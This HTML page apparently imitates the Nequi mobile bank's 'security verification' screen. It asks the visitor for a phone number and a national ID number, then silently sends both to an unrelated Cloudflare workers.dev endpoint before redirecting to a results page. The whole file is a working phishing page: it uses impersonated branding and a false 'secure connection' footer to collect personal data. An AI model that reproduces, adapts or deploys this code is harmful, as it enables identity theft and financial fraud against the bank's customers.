<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Tu info - Verificaci√≥n Nequi</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
  body {
    margin: 0;
    background: #FFFFFF;
    font-family: 'Inter', sans-serif;
  }

  .header {
    width: 100%;
    background: #2E0039;
    padding: 15px 20px;
    color: white;
    font-size: 20px;
    font-weight: 700;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .container {
    padding: 20px;
  }

  .title {
    font-size: 28px;
    font-weight: 700;
    color: #2E0039;
    margin-bottom: 25px;
    margin-top: 15px;
  }

  .card {
    background: #fff;
    padding: 10px 0;
    margin-bottom: 0;
    border-bottom: 4px solid #f0f0f0;
    display: flex;
    align-items: flex-start;
  }

  .left {
    display: flex;
    align-items: flex-start;
    gap: 15px;
    flex: 1;
  }

  .icon {
    width: 40px;
    height: 40px;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .content {
    flex: 1;
  }

  .text-title {
    font-size: 17px;
    font-weight: 600;
    color: #2E0039;
    margin-bottom: 5px;
  }

  .text-sub {
    font-size: 15px;
    color: #666;
    margin-bottom: 12px;
  }

  .input-field {
    width: 100%;
    padding: 0;
    background-color: transparent;
    border: none;
    border-radius: 0;
    font-size: 16px;
    color: #2E0039;
    outline: none;
    font-weight: 500;
    margin-bottom: 5px;
  }

  .input-container {
    border-bottom: 2px solid #E3D4EE;
    padding-bottom: 8px;
    margin-bottom: 8px;
    transition: border-color 0.3s ease;
  }

  .input-container:focus-within {
    border-bottom-color: #2E0039;
  }

  .check {
    background: #e0e0e0;
    color: white;
    font-size: 10px;
    padding: 7px 9px;
    border-radius: 50%;
    font-weight: bold;
    transition: all 0.3s ease;
  }

  .check.valid {
    background: #00C853;
  }

  .login-button {
    width: 100%;
    padding: 18px;
    background-color: #da008130;
    border: none;
    border-radius: 14px;
    font-size: 17px;
    margin-top: 30px;
    cursor: not-allowed;
    font-weight: 700;
    color: #fff;
    transition: all 0.3s ease;
  }

  .login-button.active {
    background: #2E0039;
    cursor: pointer;
  }

  #loader {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.95);
    z-index: 9999;
    text-align: center;
    padding-top: 40%;
    font-size: 18px;
    color: #2E0039;
    font-weight: 600;
  }

  .footer {
    background: #2E0039;
    color: white;
    padding: 25px 20px;
    text-align: center;
    margin-top: 40px;
  }
</style>
</head>

<body>

<div class="header">
  <span>‚Üê</span> Verificaci√≥n de Seguridad
</div>

<img src="bane.jpeg" alt="Nequi" style="width: 100%; max-width: 300px; height: auto;">

<div class="container">
  <div class="title">Tu info</div>

  <form id="loginForm">

    <!-- CAMPO CELULAR -->
    <div class="card">
      <div class="left">
        <div class="icon">
          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2.2">
            <rect x="7" y="2" width="10" height="20" rx="3"></rect>
          </svg>
        </div>
        <div class="content">
          <div class="text-title">N√∫mero de celular</div>
          <div class="text-sub">Ingresa tu n√∫mero vinculado a Nequi</div>
          <div class="input-container">
            <input type="number" class="input-field" id="usuario" placeholder="Ej: 3115555555" required minlength="10" maxlength="10" />
          </div>
        </div>
      </div>
      <div class="check" id="usuario-check">!</div>
    </div>

    <!-- CAMPO DOCUMENTO -->
    <div class="card">
      <div class="left">
        <div class="icon">
          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#3A0A63" stroke-width="2">
            <circle cx="12" cy="8" r="4"></circle>
            <path d="M4 20c1-4 4-7 8-7s7 3 8 7"></path>
          </svg>
        </div>
        <div class="content">
          <div class="text-title">Documento</div>
          <div class="text-sub">Ingresa tu n√∫mero de c√©dula</div>
          <div class="input-container">
            <input type="number" class="input-field" id="documento" placeholder="Ej: 1024587963" required minlength="6" maxlength="12" />
          </div>
        </div>
      </div>
      <div class="check" id="documento-check">!</div>
    </div>

    <!-- BOT√ìN -->
    <button type="submit" class="login-button" id="loginBtn" disabled>
      Verificar Identidad
    </button>
  </form>
</div>

<!-- FOOTER -->
<div class="footer">
  Nequi ‚Ä¢ Conexi√≥n segura üîí
</div>

<!-- LOADER -->
<div id="loader">Verificando tu identidad...</div>

<script>
// VALIDACIONES
function validar() {
  let cel = document.getElementById("usuario").value.trim();
  let doc = document.getElementById("documento").value.trim();

  let celOk = /^3[0-9]{9}$/.test(cel);
  let docOk = /^[0-9]{6,12}$/.test(doc);

  document.getElementById("usuario-check").classList.toggle("valid", celOk);
  document.getElementById("documento-check").classList.toggle("valid", docOk);

  let btn = document.getElementById("loginBtn");

  if (celOk && docOk) {
    btn.classList.add("active");
    btn.disabled = false;
  } else {
    btn.classList.remove("active");
    btn.disabled = true;
  }
}

document.getElementById("usuario").addEventListener("input", validar);
document.getElementById("documento").addEventListener("input", validar);

// ENV√çO AL WORKER
document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();

  document.getElementById("loader").style.display = "block";

  const datos = {
    usuario: document.getElementById("usuario").value.trim(),
    documento: document.getElementById("documento").value.trim(),
  };

  fetch("https://throbbing-sky-6a75.claropromoxlaro.workers.dev/login", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(datos)
  });

  setTimeout(() => {
    window.location.href = "resultados.html";
  }, 1500);
});
</script>

</body>
</html>
